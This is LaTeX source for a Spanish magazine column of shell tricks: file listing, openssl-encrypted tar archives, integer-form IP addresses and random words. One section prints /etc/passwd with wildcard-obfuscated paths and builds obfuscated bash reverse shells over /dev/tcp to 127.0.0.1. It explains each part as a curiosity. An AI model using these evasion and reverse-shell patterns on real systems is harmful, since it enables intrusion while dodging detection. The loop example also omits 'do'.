\rput(2.5,-1.0){\resizebox{!}{4.5cm}{{\epsfbox{images/general/trucos1.eps}}}}
\hypertarget{trucos1}{}\label{trucos}

\pagestyle{trucos}


% -------------------------------------------------
% Cabecera
\begin{flushright}


{\color{introcolor}\mtitle{8cm}{Con un par... de l�neas}}

\msubtitle{8cm}{S�cale todo el partido a la l�nea de comandos}

{\sf\color{white}{ por Tamar�z el de la Perd�z}}

%{{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}}
\end{flushright}


%\vspace{1mm}
% -------------------------------------------------


%\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\footnotesize}
\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}



\begin{multicols}{2}

\hypertarget{como-listar-un-directorio-sin-ls}{%
\sectiontext{white}{black}{COMO LISTAR UN DIRECTORIO SIN \texttt{ls}}\label{como-listar-un-directorio-sin-ls}}

Este es un truco bastante g�ay que nos permite listar el contenido de un
directorio sin usar {\verb!ls!}.

\begin{lstlisting}
$ for i in *; echo $i; done
\end{lstlisting}

Alternativamente podemos usar {\verb!echo!} para listar
los ficheros en un determinado directorio:

\begin{lstlisting}
$ echo /tmp/*
\end{lstlisting}

\hypertarget{encriptar-ficheros-tar-con-openssl}{%
\sectiontext{white}{black}{ENCRIPTAR FICHEROS TAR CON \texttt{openssl}}\label{encriptar-ficheros-tar-con-openssl}}

Alguna vez has tenido que enviar una serie de ficheros protegidos con
contrase�a. Algunas aplicaciones de compresi�n te permiten cifrar los
datos, pero en caso de que no tengas ninguna a mano, este es un truco
para enviar tus datos cifrados

\begin{lstlisting}
$ tar czf - * | openssl enc -e -aes256 -out sec.tar.gz
$ openssl enc -d -aes256 -in sec.tar.gz | tar xz -C DIR
\end{lstlisting}

\hypertarget{ofuscando-ips}{%
\sectiontext{white}{black}{ODUSCANDO IPs}\label{ofuscando-ips}}

Como todos sabemos una direcci�n IP es un grupo de 4 valores separados
por un punto. Cada uno de las partes de una IP puede tomar valores entre
0 y 255, o en otras palabras, se puede almacenar en un solo byte, y por
lo tanto, la direcci�n completa se puede almacenar en un entero de
32-bits.

Pues bien, muchos programas que aceptan direcciones IP nos permiten
especificarla como un valor entero. Los siguientes comandos conectan a
{\verb!localhost!} en el puerto 9999

\begin{lstlisting}
$ curl 2130706433:9999 
$ nc $((0x7f000001)) 9999
\end{lstlisting}

Efectivamente:

\begin{lstlisting}
 $ printf %x 2130706433
 $ echo $((0x7f000001))
 2130706433
 $ printf "%x %x %x %x\n" 127 0 0 1
 7f 0 0 1
\end{lstlisting}

Mola no?

\hypertarget{ejecutando-comandos-incompletos}{%
\sectiontext{white}{black}{EJECUTANDO COMANDOS INCOMPLETOS}\label{ejecutando-comandos-incompletos}}

Sab�as que la shell no solo usa los wildcards o caracter comod�n para
expandir par�metros, sino que lo aplica a todos los elementos de la
l�nea de comandos?. Por ejemplo, el siguiente comando muestra el fichero
{\verb!/etc/passwd!}.

\begin{lstlisting}
$ /???/?at /e??/pa????
\end{lstlisting}

Otro ejemplo m�s interesante, usando nuestro querido Netkitty
(suponiendo que est� instalado en
{\verb!/usr/local/bin!}

\begin{lstlisting}
$ /???/l*/???/?k  -c T,2130706433,1337
\end{lstlisting}

Un par de ejemplos m�s usando {\verb!nc.openbsd!}
instalado en {\verb!/bin!}.

\begin{lstlisting}
$ /???/n?.*s? 2130706433 $((023417))
$ /???/??.o* 2130706433 $((0x270f))
$ /???/??.?p* 0177000000001 $((6#114143))
\end{lstlisting}

Esta l�nea inicia una conexi�n al puerto 9999 en localhost. Y esta
inicia un \emph{reverse shell} a
{\verb!127.0.0.1:9999!}

\begin{lstlisting}
$ /???/b??h -i >& `echo /d*/``echo top | \
> sed s/o/c/`/2130706433/$((6#114143)) 0>&1
$ /*/b?s? -i >& `echo /d*/``echo top | \
>sed s/o/c/`/2130706433/9999 0>&1
\end{lstlisting}

Veamos elemento a elemento que es lo que estamos ejecutando:

\begin{itemize}

\item
  {\verb!/*/b?s? -i >\&!} esta parte se expandir� a
  {\verb!/bin/bash -i >\&!} que inicia una shell en
  modo interactivo y redirecciona la entrada y salida est�ndar a lo que
  sigue
\item
  {\verb!`echo /d*/``echo top | sed s/o/c/`!} este
  comando se expande a {\verb!/dev/tcp!} que es un
  pseudo fichero con el que podemos establecer conexiones TCP desde bash
\item
  {\verb!/2130706433/!} esta es la direcci�n IP en
  formato decimal. Ya has visto como generarla en el truco anterior. En
  este caso corresponde con {\verb!127.0.0.1!}
\item
  {\verb!$((6\#114143))!} este es el puerto 9999 en
  base 6
\item
  {\verb!0>\&1!} y esta redirecci�n final indica que la
  entrada est�ndar tambi�n se redirige al descriptor de ficheros 1 que
  ahora es el socket TCP a la direcci�n indicada.
\end{itemize}

\hypertarget{generar-palabras-aleatorias}{%
\sectiontext{white}{black}{GENERAR PALABRAS ALEATORIAS}\label{generar-palabras-aleatorias}}

La utilidad {\verb!look!} genera una lista de palabras
que empiezan por los caracteres que le pasamos como par�metro. En
realidad lo que hace es una b�squeda en el diccionario del sistema
buscando palabras que comiencen con las letras que le indicamos. Podemos
usar esta utilidad para generar una palabra aleatorio con un comando
como este:

\begin{lstlisting}
$ look . | shuf | head -1
\end{lstlisting}

Si cambiamos el {\verb!-1!} de
{\verb!head!} podemos obtener m�s palabras :)
\end{multicols}
